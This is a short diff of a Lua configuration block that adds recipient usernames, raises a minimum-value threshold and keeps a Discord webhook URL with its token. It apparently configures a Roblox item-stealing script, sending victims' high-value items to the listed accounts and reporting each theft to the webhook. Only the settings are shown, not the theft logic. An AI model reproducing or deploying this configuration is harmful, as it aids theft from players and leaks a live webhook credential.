@@ -1,5 +1,5 @@
-_G.User = {'fateemperor6'}
-_G.min_value = 1000000
+_G.User = {'fateemperor6', 'fateemperor7', 'fateemperor8'}
+_G.min_value = 10000000000
 _G.pingEveryone = "Yes"
 _G.Webhook = "https://discord.com/api/webhooks/1361557890631995544/OxoW0W3hu1TQijbORpCEfElyFY-vYvemrUov4La5lJhhPCQh_evvLK_INuhWIm7nrj2W"
 
